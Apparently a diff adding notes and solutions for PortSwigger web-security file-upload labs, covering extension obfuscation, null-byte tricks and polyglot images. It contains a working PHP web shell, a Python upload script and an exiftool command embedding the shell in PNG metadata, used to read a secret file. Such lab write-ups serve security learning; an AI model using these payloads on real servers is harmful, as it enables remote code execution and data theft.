@@ -234,3 +234,172 @@ This means that we should try to upload a `.htaccess`, which allows a filetype o
 Using the python multipart script from the previous labs and our newly uploaded `.htaccess` file we can now upload a `webshell.l33t` file containing: `<?php echo system($_GET['command']);`. Going back to our account page, we observe that the avatars are fetched from `{labUrl}/files/avatars/`. This means we can execute: `t/files/avatars/webshell.l33t?command=cat /home/carlos/secret`. This gave me the secret and solved the lab!
 
 ## Obfuscating file extensions
+
+A common way to evade exhaustive blacklists are obfuscating file extensions, in order to confuse the validating code but not the process which executes the files. This can be done by using URL encoding on special characters: `exploit.php` --> `exploit%2Ephp`. Other methods include:
+
+- providing multiple extensions: `exploit.php` --> `exploit.php.jpg`. Depending on the parse order, this could bypass validation but be executed as php.
+- Adding trailing characters: `exploit.php` --> `exploit.php.`. Could also work with whitespaces.
+- Adding semicolons or URL-encoded null byte chars. Depending on the language of validation code vs. server execution processes, these can be interpreted as different end of filename chars. `exploit.php` --> `exploit.php;.jpg` or `exploit.php` --> `exploit.asp%00.jpg`.
+- Multibyte unicode characters could be converted tp null bytes or dots after a conversion happens server side. This could be sequences like: `xC0 x2E, xC4 xAE or xC0 xAE` --> `x2E` if an UTF-8 to ASCII conversion is done.
+
+A final defensive way of disallowing file extensions is stripping the extension from the file name. If this is not done recursively (or checked after each removal) a filename like `exploit.p.phphp` will result in: `exploit.php` after the stripping has been done. Many more obfuscation methods exist.
+
+## Lab: Web shell upload via obfuscated file extension
+
+**Lab Description**:  This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. 
+
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+### Lab solution
+
+We are presented with an avatar upload functionality once again, this means the approach will be the same as in the previous labs.
+
+Trying to upload our trusted `webshell.php` results in the following response: 
+
+```HTML
+Sorry, only JPG & PNG files are allowed
+Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
+```
+
+The description says that the validation can be bypassed using a classic obfuscation technique, and since the reponse tells us that `.jpg` and `.png` are allowed, let's try to append one of these to our webshell. The file will look like this: `webshell.php.jpg`
+
+In order to upload the file, i modified the multipart python script: 
+
+```python
+import requests
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+# response = requests.get("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account?id=wiener")
+multipart_data = MultipartEncoder(fields={
+    'avatar': ('webshell.php.jpg', "<?php echo system($_GET['command']);", "image/jpeg"),
+    'csrf': "ppP0cOArqEAJywpjk01eQEXQ9fwtKa7b",
+    'user': "wiener"
+})
+
+headers = {
+    "Cookie": "session=nMnoFTgdIRkE5Tx3ekHqmQ3xRmy930Jz",
+    'Content-Type': multipart_data.content_type
+}
+
+response = requests.post("https://0a88003f0373832b84c5774e004d00d5.web-security-academy.net/my-account/avatar", headers=headers, data=multipart_data)
+
+print(response.text, " - ", response.status_code)
+```
+
+The response came back as: 
+
+```HTML
+The file avatars/webshell.php.jpg has been uploaded.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>  -  200
+```
+
+Yay! Seems like a success. Lets try to use our newly uploaded webshell.Files are located on the `/files/avatars/` path yet again. Visiting the path, we are met by a message telling us that the image contains errors and therefore cannot be displayed. This is because our file still has the `.jpg` part appended. We need to strip it. Using the tricks mentioned during the learning path we can insert a nullbyte. The filename becomes: `webshell.php%00.jpg`.
+
+The response instantly looks better. Notice there is no `.jpg` in the filename:
+
+```html
+The file avatars/webshell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>  -  200
+```
+
+Now visiting the file, will print out carlos secret! Very neat trick to bypass both validation and constraints on executing the file. This solves the lab!
+
+## Flawed validation of file contents
+
+Some servers validate the contents of the file being uploaded instead of trusting the insecrue `Content-Type` header. This could be magic bytes or properties of the specified file type. Like dimensions for an image. Checking magic bytes include verifying specific sequences of bytes which are always found in a file of a certain type. Sometimes, even checking these sequences can be too little protection, as tools such as ExifTool can be used to create files with malicious code inside the metadata.
+
+## Lab: Remote code execution via polyglot web shell upload
+
+**Lab Description**:   This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.
+
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+### Lab solution
+
+First, we should verify which type of file we are able to upload to the server. Given that it is an image upload function, a good bet would be only image file types such as `jpg`, `jpeg` and `png`. Using a random `.png` file, we are able to upload a file:
+
+```html
+The file avatars/Screenshot from 2024-04-30 16-28-33.png has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
+```
+
+ Lets try to see the error we are going to get with pure `.php` file:
+
+```html
+Error: file is not a valid image
+Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
+```
+
+We get a 403 (forbidden) and the above output. We can simply try to use ExifTool to encode our webshell with jpg or png data, we do not know anything about how the content validation is done, but assuming it is the first bytes of the file will be the first approach.
+
+Using exiftool and an existing `.png` it was possible to create a modified png image, with the webshell in the metadata. The commands used were:
+
+```bash
+exiftool -comment="<?php echo system(\$_GET['command']); ?>" webshellTest.png
+```
+
+Notice that you need to escape the `$` sign. If we use exiftool to print the information we get:
+
+```bash
+ExifTool Version Number         : 12.64
+File Name                       : webshellTest.png
+Directory                       : .
+File Size                       : 52 kB
+File Modification Date/Time     : 2024:05:01 19:06:36+02:00
+File Access Date/Time           : 2024:05:01 19:07:00+02:00
+File Inode Change Date/Time     : 2024:05:01 19:06:36+02:00
+File Permissions                : -rw-rw-r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 612
+Image Height                    : 384
+Bit Depth                       : 8
+Color Type                      : RGB with Alpha
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Significant Bits                : 8 8 8 8
+Software                        : 
+Creation Time                   : Tue 30 Apr 2024 04:04:00 PM CEST
+Comment                         : <?php echo system($_GET['command']); ?>
+Image Size                      : 612x384
+Megapixels                      : 0.235
+```
+
+And the webshell is inplace at the Comment tag. I dont imagine that this just works, but lets give it a shot. Naturally the file is located at: `{yourLabLink}.web-security-academy.net/files/avatars/webshellTest.png`. Naturally, visiting the path and giving a command, simply returns the image. We need the server to interpret our image as code. Maybe chaning the extension will work, if that is not being verified.
+
+Surely enough, uploading the file with a `.php` works fine:
+
+```html
+The file avatars/webshellTest.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
+
+```
+
+Visiting this file with `?command=ls` appended will output a large amount of gibberish, but also the contents of the current directory:
+
+```png
+PNG
+
+   
+IHDR  d     ,~µ   sBIT|d   tEXtSoftware gnome-screenshotï¿>   .tEXtCreation Time Tue 30 Apr 2024 04:04:00 PM CESTd!¤   /tEXtComment Screenshot from 2024-04-30 16-28-33.png
+polyglot.php
+webshellTest.php
+webshellTest.png
+webshellTest.pngqXäP    IDATxìÝw\UåÀñÏá^öA6¸÷Þ£45÷*÷OÍfÚree¤Ü{ïÔÊ=s¸q ¢¢ìuïýý&S/]ªïûõâõë¹Ïó=ÏyÎy¾ç9ÅÂÂKB!0#C Bñ_'	B!IB&Ba`	!B$dB!&	ÅÌèÑýñôt1tB!þF	ñèÑã5C!âN2!
+ÉÓÓêÕËãééB½zU°±±2tHB!þ¡$!¢lm­(YÒ //WÌÌLB*IÈ(¤ÐÐ
+```
+
+**Note**: I shortened the output for brevity.
+
+As you can see the files are listed in the output. Now we just need to output the secret. This is done with the command: `cat /home/carlos/secret` which outputs:
+
+```html
+PNG  IHDRd,~µsBIT|dtEXtSoftwaregnome-screenshotï¿>.tEXtCreation TimeTue 30 Apr 2024 04:04:00 PM CESTd!¤/tEXtCommentk3nLb88FzkBr37T3Xmi9VHQMCi5RodLrk3nLb88FzkBr37T3Xmi9VHQMCi5RodLrqXäP IDATxìÝw\UåÀñÏá^öA6¸÷Þ£45÷*÷OÍfÚree¤Ü{ïÔÊ=s¸q ¢¢ìuïýý&S/]ªïûõâõë¹Ïó=ÏyÎy¾ç9ÅÂÂKB!0#C Bñ_' B!IB&Ba` !B$dB!& ÅÌèÑýñôt1tB!þF ñèÑã5C!âN2! ÉÓÓêÕËãééB½zU°±±2tHB!þ¡$!¢lm­(YÒ//
+```
+
+where the secret is just after *Comment*: `Commentk3nLb88FzkBr37T3Xmi9VHQMCi5RodLr`. This solves the lab!
+
+**Note**: I viewed the solution on Portswigger afterwards. They create a polyglot file where a `.php` is the output of ExifTool using `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`. Also adding a *Start* and *End* to the output, to easilier identify where the outputted string is. Quite neat trick.
+
